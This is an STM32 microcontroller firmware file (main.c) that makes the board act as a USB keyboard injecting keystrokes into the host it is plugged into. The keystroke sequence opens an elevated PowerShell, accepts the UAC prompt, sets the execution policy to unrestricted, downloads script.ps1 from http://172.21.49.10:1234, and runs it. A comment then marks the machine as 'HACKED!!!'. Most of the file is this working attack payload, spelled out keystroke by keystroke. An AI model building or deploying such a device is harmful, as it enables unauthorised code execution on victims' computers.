/* USER CODE BEGIN Header */
/**
  ******************************************************************************
  * @file           : main.c
  * @brief          : Main program body
  ******************************************************************************
  * @attention
  *
  * Copyright (c) 2024 STMicroelectronics.
  * All rights reserved.
  *
  * This software is licensed under terms that can be found in the LICENSE file
  * in the root directory of this software component.
  * If no LICENSE file comes with this software, it is provided AS-IS.
  *
  ******************************************************************************
  */
/* USER CODE END Header */
/* Includes ------------------------------------------------------------------*/
#include "main.h"
#include "usb_device.h"

/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */
#include "usbd_hid.h"

/* USER CODE END Includes */

/* Private typedef -----------------------------------------------------------*/
/* USER CODE BEGIN PTD */

/* USER CODE END PTD */

/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */
/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */

/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/

/* USER CODE BEGIN PV */

/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/
void SystemClock_Config(void);
static void MX_GPIO_Init(void);
/* USER CODE BEGIN PFP */

/* USER CODE END PFP */

/* Private user code ---------------------------------------------------------*/
/* USER CODE BEGIN 0 */

extern USBD_HandleTypeDef hUsbDeviceFS;

typedef struct {

	uint8_t MODIFIER;
	uint8_t RESERVED;
	uint8_t KEYCODE1;
	uint8_t KEYCODE2;
	uint8_t KEYCODE3;
	uint8_t KEYCODE4;
	uint8_t KEYCODE5;
	uint8_t KEYCODE6;


} keyboardHID;

keyboardHID keyboardhid = {0,0,0,0,0,0,0,0};
/* USER CODE END 0 */

/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
  /* USER CODE BEGIN 1 */

  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();

  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();

  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
  MX_USB_DEVICE_Init();
  /* USER CODE BEGIN 2 */
  	  HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, SET);
  	  HAL_Delay(1000);
	  keyboardhid.MODIFIER = 0x08;
	  keyboardhid.KEYCODE1 = 0x15;
      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press GIU
      HAL_Delay(20);
      keyboardhid.MODIFIER = 0x00;
      keyboardhid.KEYCODE1 = 0x00;
      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //ralease GIU

      HAL_Delay(50);


      keyboardhid.KEYCODE1 = 0x13;
      keyboardhid.KEYCODE2 = 0x12;
      keyboardhid.KEYCODE3 = 0x1A;
      keyboardhid.KEYCODE4 = 0x08;
      keyboardhid.KEYCODE5 = 0x15;
      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press power
      HAL_Delay(20);
      keyboardhid.KEYCODE1 = 0x00;
      keyboardhid.KEYCODE2 = 0x00;
      keyboardhid.KEYCODE3 = 0x00;
      keyboardhid.KEYCODE4 = 0x00;
      keyboardhid.KEYCODE5 = 0x00;
      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));

      HAL_Delay(20);

      keyboardhid.KEYCODE1 = 0x16;
      keyboardhid.KEYCODE2 = 0x0B;
      keyboardhid.KEYCODE3 = 0x08;
      keyboardhid.KEYCODE4 = 0x0F;
      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press shel
      HAL_Delay(20);
      keyboardhid.KEYCODE1 = 0x00;
      keyboardhid.KEYCODE2 = 0x00;
      keyboardhid.KEYCODE3 = 0x00;
      keyboardhid.KEYCODE4 = 0x00;
      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));

      HAL_Delay(20);

      keyboardhid.KEYCODE1 = 0x0F;
      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press l
      HAL_Delay(20);
      keyboardhid.KEYCODE1 = 0x00;
      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
      HAL_Delay(20);

      keyboardhid.MODIFIER = 0x03;
      keyboardhid.KEYCODE1 = 0x28;
      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press <Ctrl + Shift + ENTER>
      HAL_Delay(20);
      keyboardhid.MODIFIER = 0x00;
      keyboardhid.KEYCODE1 = 0x00;
      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
      HAL_Delay(1000);

      keyboardhid.KEYCODE1 = 0x50;
      keyboardhid.KEYCODE2 = 0x28;
      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press <left arrow + ENTER>
      HAL_Delay(20);
      keyboardhid.KEYCODE1 = 0x00;
      keyboardhid.KEYCODE2 = 0x00;
      USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));


      //----------------------------
      HAL_Delay(1000);

      keyboardhid.KEYCODE1 = 0x16;
	  keyboardhid.KEYCODE2 = 0x08;
	  keyboardhid.KEYCODE3 = 0x17;
	  keyboardhid.KEYCODE4 = 0x2D;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press set-
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x08;
	  keyboardhid.KEYCODE2 = 0x1B;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press ex
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x08;
	  keyboardhid.KEYCODE2 = 0x06;
	  keyboardhid.KEYCODE3 = 0x18;
	  keyboardhid.KEYCODE4 = 0x17;
	  keyboardhid.KEYCODE5 = 0x0C;
	  keyboardhid.KEYCODE6 = 0x12;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press ecutio
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x11;
	  keyboardhid.KEYCODE2 = 0x13;
	  keyboardhid.KEYCODE3 = 0x12;
	  keyboardhid.KEYCODE4 = 0x0F;
	  keyboardhid.KEYCODE5 = 0x0C;
	  keyboardhid.KEYCODE6 = 0x06;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press npolic
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);


	  keyboardhid.KEYCODE1 = 0x1C;
	  keyboardhid.KEYCODE2 = 0x2C;
	  keyboardhid.KEYCODE3 = 0x18;
	  keyboardhid.KEYCODE4 = 0x11;
	  keyboardhid.KEYCODE5 = 0x15;
	  keyboardhid.KEYCODE6 = 0x08;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press y unre
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x16;
	  keyboardhid.KEYCODE2 = 0x17;
	  keyboardhid.KEYCODE3 = 0x15;
	  keyboardhid.KEYCODE4 = 0x0C;
	  keyboardhid.KEYCODE5 = 0x06;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press stric
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);


	  keyboardhid.KEYCODE1 = 0x17;
	  keyboardhid.KEYCODE2 = 0x08;
	  keyboardhid.KEYCODE3 = 0x07;
      keyboardhid.KEYCODE4 = 0x28;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press ted <ENTER>
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);


	  /*keyboardhid.KEYCODE1 = 0x1C;
	  keyboardhid.KEYCODE2 = 0x28;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press y <ENTER>
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20); */


	  keyboardhid.KEYCODE1 = 0x0C;
	  keyboardhid.KEYCODE2 = 0x11;
	  keyboardhid.KEYCODE3 = 0x19;
	  keyboardhid.KEYCODE4 = 0x12;
	  keyboardhid.KEYCODE5 = 0x0E;
	  keyboardhid.KEYCODE6 = 0x08;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press invoke
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x2D;
	  keyboardhid.KEYCODE2 = 0x1A;
	  keyboardhid.KEYCODE3 = 0x08;
	  keyboardhid.KEYCODE4 = 0x05;
	  keyboardhid.KEYCODE5 = 0x15;
	  keyboardhid.KEYCODE6 = 0x08;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press -webre
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x14;
	  keyboardhid.KEYCODE2 = 0x18;
	  keyboardhid.KEYCODE3 = 0x08;
	  keyboardhid.KEYCODE4 = 0x16;
	  keyboardhid.KEYCODE5 = 0x17;
	  keyboardhid.KEYCODE6 = 0x2C;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press quest
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x2D;
	  keyboardhid.KEYCODE2 = 0x18;
	  keyboardhid.KEYCODE3 = 0x15;
	  keyboardhid.KEYCODE4 = 0x0C;
	  keyboardhid.KEYCODE5 = 0x2C;
	  keyboardhid.KEYCODE6 = 0x34;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press -uri '
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x0B;
	  keyboardhid.KEYCODE2 = 0x17;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press ht
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x17;
	  keyboardhid.KEYCODE2 = 0x13;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press tp
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);


	  keyboardhid.MODIFIER = 0x02;
	  keyboardhid.KEYCODE1 = 0x33;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press :
	  HAL_Delay(20);
	  keyboardhid.MODIFIER = 0x00;
	  keyboardhid.KEYCODE1 = 0x00;                            //release :
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x38;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press /
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;                            //release /
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x38;
	  keyboardhid.KEYCODE2 = 0x1E;
	  keyboardhid.KEYCODE3 = 0x24;
	  keyboardhid.KEYCODE4 = 0x1F;
	  keyboardhid.KEYCODE5 = 0x37;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press /172.
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x1F;
	  keyboardhid.KEYCODE2 = 0x1E;
	  keyboardhid.KEYCODE3 = 0x37;
	  keyboardhid.KEYCODE4 = 0x21;
	  keyboardhid.KEYCODE5 = 0x26;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 21.49
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x37;
	  keyboardhid.KEYCODE2 = 0x1E;
	  keyboardhid.KEYCODE3 = 0x27;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press .10
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.MODIFIER = 0x02;
	  keyboardhid.KEYCODE1 = 0x33;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press :
	  HAL_Delay(20);
	  keyboardhid.MODIFIER = 0x00;
	  keyboardhid.KEYCODE1 = 0x00;                            //release :
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x1E;
	  keyboardhid.KEYCODE2 = 0x1F;
	  keyboardhid.KEYCODE3 = 0x20;
	  keyboardhid.KEYCODE4 = 0x21;
	  keyboardhid.KEYCODE5 = 0x38;
	  keyboardhid.KEYCODE6 = 0x16;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press 1234/s
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x06;
	  keyboardhid.KEYCODE2 = 0x15;
	  keyboardhid.KEYCODE3 = 0x0C;
	  keyboardhid.KEYCODE4 = 0x13;
	  keyboardhid.KEYCODE5 = 0x17;
	  keyboardhid.KEYCODE6 = 0x37;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press cript.
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);


	  keyboardhid.KEYCODE1 = 0x13;
	  keyboardhid.KEYCODE2 = 0x16;
	  keyboardhid.KEYCODE3 = 0x1E;
	  keyboardhid.KEYCODE4 = 0x34;
	  keyboardhid.KEYCODE5 = 0x2C;
	  keyboardhid.KEYCODE6 = 0x2D;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press ps1' -
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);


	  keyboardhid.KEYCODE1 = 0x12;
	  keyboardhid.KEYCODE2 = 0x18;
	  keyboardhid.KEYCODE3 = 0x17;
	  keyboardhid.KEYCODE4 = 0x09;
	  keyboardhid.KEYCODE5 = 0x0C;
	  keyboardhid.KEYCODE6 = 0x0F;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press outfil
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;


	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);


	  keyboardhid.KEYCODE1 = 0x08;
	  keyboardhid.KEYCODE2 = 0x2C;
	  keyboardhid.KEYCODE3 = 0x34;
	  keyboardhid.KEYCODE4 = 0x37;
	  keyboardhid.KEYCODE5 = 0x38;
	  keyboardhid.KEYCODE6 = 0x16;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press e './s
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);


	  keyboardhid.KEYCODE1 = 0x06;
	  keyboardhid.KEYCODE2 = 0x15;
	  keyboardhid.KEYCODE3 = 0x0C;
	  keyboardhid.KEYCODE4 = 0x13;
	  keyboardhid.KEYCODE5 = 0x17;
	  keyboardhid.KEYCODE6 = 0x37;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press cript.
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);


	  keyboardhid.KEYCODE1 = 0x13;
	  keyboardhid.KEYCODE2 = 0x16;
	  keyboardhid.KEYCODE3 = 0x1E;
	  keyboardhid.KEYCODE4 = 0x34;
	  keyboardhid.KEYCODE5 = 0x33;
	  keyboardhid.KEYCODE6 = 0x37;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press ps1';
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);

	  keyboardhid.KEYCODE1 = 0x31;
	  keyboardhid.KEYCODE2 = 0x16;
	  keyboardhid.KEYCODE3 = 0x06;
	  keyboardhid.KEYCODE4 = 0x15;
	  keyboardhid.KEYCODE5 = 0x0C;
	  keyboardhid.KEYCODE6 = 0x13;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press /scrip
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;
	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);


	  keyboardhid.KEYCODE1 = 0x17;
	  keyboardhid.KEYCODE2 = 0x37;
	  keyboardhid.KEYCODE3 = 0x13;
	  keyboardhid.KEYCODE4 = 0x16;
	  keyboardhid.KEYCODE5 = 0x1E;
	  keyboardhid.KEYCODE6 = 0x28;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));    //press t.ps1 <ENTER>
	  HAL_Delay(20);
	  keyboardhid.KEYCODE1 = 0x00;
	  keyboardhid.KEYCODE2 = 0x00;
	  keyboardhid.KEYCODE3 = 0x00;
	  keyboardhid.KEYCODE4 = 0x00;
	  keyboardhid.KEYCODE5 = 0x00;
	  keyboardhid.KEYCODE6 = 0x00;

	  USBD_HID_SendReport(&hUsbDeviceFS,&keyboardhid,sizeof(keyboardhid));
	  HAL_Delay(20);


      //HACKED!!!
      HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, RESET);

  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while (1)
  {
    /* USER CODE END WHILE */

    /* USER CODE BEGIN 3 */
  }

  /* USER CODE END 3 */
}

/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSE;
  RCC_OscInitStruct.HSEState = RCC_HSE_ON;
  RCC_OscInitStruct.HSEPredivValue = RCC_HSE_PREDIV_DIV1;
  RCC_OscInitStruct.HSIState = RCC_HSI_ON;
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_ON;
  RCC_OscInitStruct.PLL.PLLSource = RCC_PLLSOURCE_HSE;
  RCC_OscInitStruct.PLL.PLLMUL = RCC_PLL_MUL9;
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
  {
    Error_Handler();
  }

  /** Initializes the CPU, AHB and APB buses clocks
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_SYSCLK
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2;
  RCC_ClkInitStruct.SYSCLKSource = RCC_SYSCLKSOURCE_PLLCLK;
  RCC_ClkInitStruct.AHBCLKDivider = RCC_SYSCLK_DIV1;
  RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV2;
  RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK)
  {
    Error_Handler();
  }
  PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USB;
  PeriphClkInit.UsbClockSelection = RCC_USBCLKSOURCE_PLL_DIV1_5;
  if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
  {
    Error_Handler();
  }
}

/**
  * @brief GPIO Initialization Function
  * @param None
  * @retval None
  */
static void MX_GPIO_Init(void)
{
  GPIO_InitTypeDef GPIO_InitStruct = {0};

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
  __HAL_RCC_GPIOD_CLK_ENABLE();
  __HAL_RCC_GPIOA_CLK_ENABLE();

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOC, GPIO_PIN_13, GPIO_PIN_RESET);

  /*Configure GPIO pin : PC13 */
  GPIO_InitStruct.Pin = GPIO_PIN_13;
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
  GPIO_InitStruct.Pull = GPIO_NOPULL;
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
  HAL_GPIO_Init(GPIOC, &GPIO_InitStruct);

}

/* USER CODE BEGIN 4 */

/* USER CODE END 4 */

/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
  {
  }
  /* USER CODE END Error_Handler_Debug */
}

#ifdef  USE_FULL_ASSERT
/**
  * @brief  Reports the name of the source file and the source line number
  *         where the assert_param error has occurred.
  * @param  file: pointer to the source file name
  * @param  line: assert_param error line source number
  * @retval None
  */
void assert_failed(uint8_t *file, uint32_t line)
{
  /* USER CODE BEGIN 6 */
  /* User can add his own implementation to report the file name and line number,
     ex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
  /* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */
